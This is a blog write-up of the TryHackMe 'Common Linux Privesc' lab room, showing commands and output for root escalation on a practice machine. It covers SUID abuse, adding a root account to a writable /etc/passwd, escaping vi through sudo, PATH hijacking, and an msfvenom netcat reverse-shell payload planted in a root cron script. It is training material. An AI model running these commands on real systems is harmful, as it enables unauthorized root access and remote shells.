---
layout: post
title: TryHackMe - Common Linux Privesc
---

## Enumeration

First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.

### What is the target's hostname?
```
user@**polobox**
```
### Look at the output of /etc/passwd how many "user[x]" are there on the system?
```
user3@polobox:~$ grep /etc/passwd -e 'user[0-9]' | wc -l
8
user3@polobox:~$ ls /home | wc -l
8
```
### How many available shells are there on the system?
```
user3@polobox:~$ grep /etc/shells -e bin | wc -l
4
```
### What is the name of the bash script that is set to run every 5 minutes by cron?
```
user3@polobox:~$ cat /etc/crontab
[...]
# m h dom mon dow user	command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
### What critical file has had its permissions changed to allow some users to write to it?

/etc/passwd has 664 instead of 644 permissions, but since the group is root this is not that big of a deal.
```
user3@polobox:~$ ls -l /etc/passwd
-rw-rw-r-- 1 root root 2694 Mar  6  2020 /etc/passwd
```

## Abusing SUID/GUID Files

The first step in Linux privilege escalation exploitation is to check  for files with  the SUID/GUID bit set. This means that the file or files can be run with  the permissions of the file(s) owner/group. In this case, as the  super-user. We can leverage this to get a shell with these privileges!

###  What is the path of the file in user3's directory that stands out to you?
```
user3@polobox:~$ find ~ -perm -u=s -type f 2>/dev/null
/home/user3/shell
```
### We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it!

Running the script gives us a root shell.

## Exploiting Writeable /etc/passwd

Exit out of root shell and `su` to `user7:password`.

### What direction privilege escalation is this attack?

Exiting out of a root shell and moving horizontally could be considered a vertical privilege deescalation.

### Create a compliant password hash to add with: "openssl passwd -1 -salt [salt] [password]". What is the hash created by using this command with the salt, "new" and the password "123"?

```
user7@polobox:/home/user3$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

### What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

### Add that entry to the end of the /etc/passwd file, and log in as root user `new:123`.

```
user7@polobox:/home/user3$ echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
user7@polobox:/home/user3$ su new
Password: 
Welcome to Linux Lite 4.4
 
You are running in superuser mode, be very careful.
 
Monday 12 October 2020, 16:45:07
Memory Usage: 335/1991MB (16.83%)
Disk Usage: 6/217GB (3%)
 
root@polobox:/home/user3# 
```

## Escaping Vi Editor

Switch to `user8:password`.

### Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?
```
user8@polobox:~$ sudo -l
[...]
User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
user8@polobox:~$ sudo vi # then type :!sh in vi

# 
```

## Exploiting Crontab
Switch to `user4:password`.

### What is the flag to specify a payload in msfvenom?
`-p`

### Make msfvenom payload
```
root@kali:~/Security/TryHackMe/commonlinuxprivesc# msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 93 bytes
mkfifo /tmp/zgeimi; nc LOCALIP 8888 0</tmp/zgeimi | /bin/sh >/tmp/zgeimi 2>&1; rm /tmp/zgeimi
```
### What directory is the "autoscript.sh" under?
```
user4@polobox:~/Desktop$ grep user4 /etc/crontab
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
```
Copy the reverse shell code into the autoscript.sh file while opening a listener on the attackers side: `nc -lvp 8888`. In about 5 minutes, you'll have a root shell.

## Exploiting PATH Variable
Switch to `user5:password`.

### Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?

```
user5@polobox:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
user5@polobox:~$ ./script
Desktop  Documents  Downloads  Music  Pictures	Public	script	Templates  Videos
```
`script` seems to be executing the `ls` command which we could commandeer.

```
user5@polobox:/tmp$ echo "/bin/bash" > ls
user5@polobox:/tmp$ chmod +x ls
user5@polobox:/tmp$ export PATH=/tmp:$PATH
user5@polobox:/tmp$ cd ~
user5@polobox:~$ ./script
[...]
root@polobox:~# # set PATH back to normal
root@polobox:~# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
root@polobox:~#
```

